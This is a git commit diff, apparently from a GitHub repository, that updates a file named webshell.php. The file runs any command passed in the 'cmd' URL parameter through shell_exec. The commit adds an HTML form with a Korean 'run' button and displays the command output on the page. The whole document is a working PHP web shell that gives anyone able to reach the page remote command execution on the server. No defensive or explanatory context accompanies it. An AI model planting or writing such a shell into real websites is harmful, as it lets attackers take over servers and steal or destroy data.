d3a1dad1ed16b7dff20d265682f8c64a72961813
dodo3366 <139212229+dodo3366@users.noreply.github.com>
2026-06-07 00:28:03 +0900

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -1,5 +1,15 @@
 <?php
 if(isset($_GET['cmd'])){
-    echo shell_exec($_GET['cmd']);
+    $result = shell_exec($_GET['cmd']);
 }
 ?>
+<!DOCTYPE html>
+<html>
+<body>
+<form method="GET">
+    <input type="text" name="cmd" style="width:300px">
+    <input type="submit" value="실행">
+</form>
+<pre><?php echo isset($result) ? $result : ''; ?></pre>
+</body>
+</html>
